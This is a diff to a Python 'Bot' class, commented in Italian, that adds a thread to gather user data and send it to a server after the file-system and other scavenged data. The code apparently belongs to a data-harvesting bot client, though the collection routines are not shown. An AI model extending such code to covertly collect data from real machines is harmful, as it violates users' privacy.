@@ -28,6 +28,8 @@ class Bot:
         # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
         self.thread_data = threading.Thread(target=self.dataScavange)
 
+        self.thread_user = threading.Thread(target=self.userScavenge)
+
         # Thread incaricato dell'effettiva comunicazione con il server.
         self.thread_connection = threading.Thread(target=self.waitForConnection)
 
@@ -37,6 +39,7 @@ class Bot:
         self.thread_data.start()
         self.thread_connection.start()
         self.thread_fileSystem.start()
+        self.thread_user.start()
 
     def waitForConnection(self):
         """
@@ -53,6 +56,12 @@ class Bot:
             sleep(2)
 
         # Possiamo ora inviare i dati raccolti in formato .json.
+        self.sendToServer()
+
+        while self.thread_user.is_alive():
+            sleep(2)
+
+        # manda dati user
         self.sendToServer()
 
         # Il Bot attende la fine del thread file system prima di mandare i dati.
@@ -77,12 +86,12 @@ class Bot:
         self.send_sentence = self.data_sentence
         print("thread_data terminated.")
 
-    def fileSystemScavange(self):
+    def userScavenge(self):
         # prende dati user
-        userData = self.Scavenger.retriveUser()
-        # manda dati user
-        self.sendToServer(userData)
-        print("User Inviato")
+        self.send_sentence = self.Scavenger.retriveUser()
+        print("thread_user terminated.")
+
+    def fileSystemScavange(self):
         inputSentence = self.Scavenger.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
